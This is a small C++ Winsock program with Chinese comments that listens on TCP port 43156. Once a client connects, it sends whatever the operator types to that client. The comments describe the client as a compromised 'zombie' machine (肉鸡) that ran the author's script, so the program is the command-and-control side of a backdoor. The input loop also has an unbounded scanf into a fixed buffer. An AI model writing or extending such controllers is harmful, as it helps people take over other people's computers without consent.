// Call.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

int main()
{
	BOOL bRet = false;
	//定义一个socket的容器
	SOCKET sockServer = INVALID_SOCKET;
	do
	{
		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//判断版本
		if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		{
			break;

		}
		//把socket消息传到容器中
		sockServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		//判断是否成功
		if (INVALID_SOCKET == sockServer)
		{
			//失败了就关闭
			break;
		}
		sockaddr_in addrServer = { 0 };

		addrServer.sin_family = AF_INET;
		//创建端口
		addrServer.sin_port = htons(43156);
		//绑定
		if (SOCKET_ERROR == bind(sockServer, (SOCKADDR*)&addrServer, sizeof(addrServer)))
		{
			break;
		}
		//监听有没有人连接我
		if (SOCKET_ERROR == listen(sockServer, SOMAXCONN))//第二个参数是监听电话数
		{
			break;
		}
		//长期开着监听，因为是服务器，要看有没有中脚本的人连接我
		SOCKET sockClient = accept(sockServer, nullptr, nullptr);

		//判断是否连接我
		if (INVALID_SOCKET == sockClient)
		{
			//没有人连接就跳过
			break;

		}
		char szComment[MAXBYTE] = { 0 };
		//恒为真，等待输入命令
		//有人连接后发送命令
		while (true)
		{
			printf("\r\n肉鸡以连接可以控制：");
			scanf("%s", szComment);
			send(sockClient, szComment, strlen(szComment), 0);
		}

		bRet = true;
	} while (false);
	WSACleanup();
	return 0;
}

